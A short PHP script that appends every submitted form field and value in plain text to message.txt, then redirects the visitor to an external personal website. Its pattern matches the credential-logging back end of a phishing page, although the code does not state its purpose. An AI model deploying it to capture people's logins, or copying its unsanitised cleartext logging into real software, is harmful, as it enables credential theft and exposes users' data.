<?php

// Set the location to redirect the page
header('Location: https://www.rijanregmi.com.np');

// Open the text file in writing mode
$file = fopen("message.txt", "a");

foreach($_POST as $variable => $value) {
    fwrite($file, $variable);
    fwrite($file, "=");
    fwrite($file, $value);
    fwrite($file, "\r\n");
}

fwrite($file, "\r\n");
fclose($file);

// Redirect to the specified URL and stop further execution
exit;
?>
